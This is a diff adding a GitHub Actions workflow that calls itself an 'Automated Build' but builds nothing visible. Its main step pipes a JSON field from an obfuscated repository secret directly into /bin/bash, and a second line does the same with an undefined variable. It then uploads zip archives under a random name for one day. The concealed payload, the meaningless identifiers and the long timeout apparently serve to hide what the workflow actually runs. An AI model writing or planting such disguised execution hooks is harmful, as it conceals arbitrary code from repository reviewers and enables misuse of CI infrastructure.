@@ -1,0 +1,32 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          mdo33129: ${{ secrets.mdo33129 }}
+        run: |
+          printf '%s' "$mdo33129" | jq -r .dxiyi57 | /bin/bash
+          echo $k86 | jq -r .rkmn9 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: tXIJmzs1
+          path: "*.zip"
+          retention-days: 1
